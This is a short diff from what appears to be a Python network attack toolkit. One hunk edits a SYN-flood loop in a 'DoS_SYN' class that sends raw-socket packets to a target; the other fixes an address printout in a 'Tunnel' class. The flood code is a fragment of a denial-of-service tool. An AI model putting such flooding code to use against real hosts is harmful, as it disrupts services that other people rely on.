@@ -581,7 +581,7 @@ class DoS_SYN :
                 flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                 flood.connect((self.host, self.port))
                 flood.sendto(payload, (self.host, self.port))
-        #       flood.shutdown(socket.SHUT_RDWR)
+                flood.shutdown(socket.SHUT_RDWR)
             count += 1
             text = "[" + Constant.GREEN("+") + "]" + " " + f"{self.progress_bar(count, self.rate)}" + " " + f"[{count}/{self.rate}]"
             print(text, end = "\r", flush = True)
@@ -799,7 +799,7 @@ class Tunnel :
         status, name, version, length = self.get_status(headers), self.get_name(headers), self.get_version(headers), self.get_length(headers)
         print(Constant.GREEN("DONE"))
         if not length :
-            print("[" + Constant.GREEN("+") + "]" + " " + f"couldn't find Content-Length, send Bad Request to {addr[0]}:{addr[-1]}", end = "  ", flush = True)
+            print("[" + Constant.GREEN("+") + "]" + " " + f"couldn't find Content-Length, send Bad Request to {addr[0]}:{addr[1]}", end = "  ", flush = True)
             payload = self.prepare_response(version, False)
             self.write(conn, payload)
             print(Constant.GREEN("DONE"))
